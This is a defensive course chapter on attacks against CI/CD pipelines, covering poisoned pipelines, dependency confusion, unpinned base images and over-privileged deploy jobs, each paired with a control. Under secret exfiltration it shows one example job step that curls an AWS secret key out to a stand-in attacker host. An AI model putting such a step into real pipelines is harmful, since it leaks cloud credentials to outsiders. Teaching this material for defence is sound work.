# 07. Attacks on CI/CD and the pipeline

## Intro

CI/CD is the **key to prod**: credentials, kubeconfig, Terraform state. Compromising **a single runner** often equals compromising the **entire environment**.

---

## Pipeline threat model

```text
[ Dev ] → [ Git ] → [ CI ] → [ Registry ] → [ Deploy ] → [ Prod ]
              ↑         ↑          ↑
         branch prot.  secrets   image trust
```

| Stage | Attack |
|------|--------|
| Git | malicious MR, stolen PAT, typosquat dep |
| CI | poisoned script in `.gitlab-ci.yml`, fork MR |
| Registry | push a malicious tag |
| Deploy | hijack Argo, kubectl from CI |

---

## Common scenarios

### 1. Secret exfiltration from CI

```yaml
# malicious job (example — do not run)
script:
  - curl -X POST https://evil.example --data "$AWS_SECRET_ACCESS_KEY"
```

**Control:** protected branches, MR approval, restricted variables, **OIDC** instead of static keys.

### 2. Poisoned pipeline (PPE)

Changing `.gitlab-ci.yml` in an MR from an external contributor → a job on a **trusted runner** with secrets.

**Control:** `rules: if $CI_PIPELINE_SOURCE == "merge_request_event"` without secrets; fork pipelines isolated.

### 3. Dependency confusion

`pip install internal-lib` → a package on public PyPI with the same name.

**Control:** private registry, lock files, dependency scan.

### 4. Compromised base image

`FROM node` without a digest → substitution on a registry mirror.

**Control:** pin digest, cosign verify, private mirror.

### 5. Over-privileged deploy job

`kubectl apply` with a cluster-admin kubeconfig in CI.

**Control:** IRSA / scoped SA, GitOps with a separate deploy token, only the required NS.

---

## OIDC vs long-lived keys

```text
GitLab job → OIDC JWT → cloud STS AssumeRole → temp creds (15 min)
```

| | Static key | OIDC |
|---|------------|------|
| Rotation | painful | automatic |
| Leak in log | catastrophic | short window |
| Scope | often too broad | trust policy per repo/branch |

Practice: [aws-intermediate/21](../aws-intermediate/21-security-ci.md), [aws-advanced/06](../aws-advanced/06-lab-oidc-ci.md).

---

## Branch protection and MRs

| Rule | Why |
|---------|--------|
| Require approval | two eyes on a pipeline change |
| No push to main | MR only |
| Signed commits (optional) | provenance |
| Security pipeline required | SAST green |

---

## GitOps and split CI/CD

```text
CI: build + scan + push (no prod creds)
CD: Argo CD pull-only from Git (no kubectl in CI)
```

Related: [gitops-intermediate](../gitops-intermediate/README.md), [gitlab-advanced/11](../gitlab-advanced/11-gitlab-and-argocd.md).

---

## DAST and staging

DAST hits a **running app** — you need an isolated staging, not prod. Staging secrets ≠ prod secrets.

---

## In mock-exams

| Practice | Course |
|----------|------|
| SAST lab | [gitlab-advanced/02](../gitlab-advanced/02-lab-sast.md) |
| Container scan | [gitlab-advanced/03](../gitlab-advanced/03-container-scanning.md) |
| Security scanning overview | [gitlab-advanced/01](../gitlab-advanced/01-security-scanning.md) |

---

## Summary

Protecting CI is **least privilege credentials**, **isolating untrusted code**, **scanning before deploy**, and **GitOps** to separate build and release.

---

## Checklist

- [ ] Can a fork MR read protected variables?
- [ ] Does the deploy job use OIDC or a static admin key?
- [ ] Are SAST/secret scans mandatory on main?

**Next:** [08. Supply chain](08-supply-chain.md).
